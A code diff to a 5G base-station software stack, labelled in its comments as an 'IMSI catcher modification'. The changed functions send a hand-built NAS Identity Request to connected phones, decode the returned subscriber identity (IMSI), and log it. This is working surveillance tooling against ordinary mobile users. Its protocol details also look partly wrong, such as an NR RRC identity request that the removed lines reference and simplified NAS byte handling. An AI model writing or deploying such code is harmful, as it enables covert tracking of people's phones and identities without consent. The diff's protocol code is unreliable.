@@ -69,19 +69,27 @@ void rrc_ue_impl::send_dl_dcch(srb_id_t srb_id, const dl_dcch_msg_s& dl_dcch_msg
   f1ap_pdu_notifier.on_new_rrc_pdu(srb_id, std::move(pdcp_pdu));
 }
 
-// IMSI catcher modification: Send identity request
+// IMSI catcher modification: Send identity request via NAS message
 void rrc_ue_impl::send_identity_request()
 {
-  logger.log_info("Sending Identity Request to UE");
+  logger.log_info("Sending Identity Request to UE via NAS");
   
+  // In NR, identity request is sent via NAS message
+  // For IMSI catcher, we'll simulate this by sending a NAS Identity Request
+  byte_buffer nas_pdu;
+  
+  // Create a simple NAS Identity Request message
+  // Note: This is a simplified implementation
+  nas_pdu.append(0x07); // NAS Security Header (Plain NAS message)
+  nas_pdu.append(0x40); // Identity Request message type
+  nas_pdu.append(0x01); // Request type: IMSI
+  
+  // Send via DL Info Transfer
   dl_dcch_msg_s dl_dcch_msg;
-  dl_dcch_msg.msg.set_c1().set_identity_request().crit_exts.set_identity_request();
+  dl_dcch_msg.msg.set_c1().set_dl_info_transfer().crit_exts.set_dl_info_transfer();
+  dl_dcch_msg.msg.c1().dl_info_transfer().crit_exts.dl_info_transfer().ded_nas_msg = nas_pdu.copy();
   
-  // Set identity request type to request IMSI
-  auto& identity_request = dl_dcch_msg.msg.c1().identity_request().crit_exts.identity_request();
-  identity_request.identity_type = identity_type_e::imsi;
-  
-  // Send the identity request on SRB1
+  // Send the NAS message on SRB1
   send_dl_dcch(srb_id_t::srb1, dl_dcch_msg);
 }
 
@@ -95,14 +103,41 @@ void rrc_ue_impl::reject_nr_secondary_cell_activation()
   // The function is a placeholder to demonstrate the intent
 }
 
-// IMSI catcher modification: Handle identity response
-void rrc_ue_impl::handle_identity_response(const asn1::rrc_nr::identity_response_s& msg)
+// IMSI catcher modification: Handle NAS messages for identity response
+void rrc_ue_impl::handle_ul_info_transfer(const ul_info_transfer_ies_s& ul_info_transfer)
 {
-  logger.log_info("Received Identity Response from UE");
+  logger.log_info("Received UL Info Transfer with NAS PDU");
   
-  // Log the received identity (IMSI)
-  if (msg.crit_exts.identity_response().identity.type() == asn1::rrc_nr::identity_response_ies_s::identity_c_::types_opts::imsi) {
-    auto imsi = msg.crit_exts.identity_response().identity.imsi();
-    logger.log_info("Received IMSI: {}", imsi.to_string());
+  // Check if this is an identity response
+  const byte_buffer& nas_pdu = ul_info_transfer.ded_nas_msg;
+  if (nas_pdu.length() >= 2) {
+    uint8_t msg_type = nas_pdu[1];
+    if (msg_type == 0x41) { // Identity Response message type
+      logger.log_info("Received Identity Response from UE");
+      
+      // Extract IMSI from NAS PDU
+      // Note: This is a simplified implementation
+      if (nas_pdu.length() > 3) {
+        std::string imsi;
+        for (size_t i = 3; i < nas_pdu.length(); i++) {
+          uint8_t b = nas_pdu[i];
+          imsi += std::to_string((b >> 4) & 0x0F);
+          if ((b & 0x0F) != 0x0F) { // 0x0F is padding
+            imsi += std::to_string(b & 0x0F);
+          }
+        }
+        logger.log_info("Received IMSI: {}", imsi);
+      }
+    }
   }
+  
+  // Original functionality: forward to NGAP
+  cu_cp_ul_nas_transport ul_nas_msg         = {};
+  ul_nas_msg.ue_index                       = context.ue_index;
+  ul_nas_msg.nas_pdu                        = ul_info_transfer.ded_nas_msg.copy();
+  ul_nas_msg.user_location_info.nr_cgi      = context.cell.cgi;
+  ul_nas_msg.user_location_info.tai.plmn_id = context.plmn_id;
+  ul_nas_msg.user_location_info.tai.tac     = context.cell.tac;
+
+  ngap_notifier.on_ul_nas_transport_message(ul_nas_msg);
 }
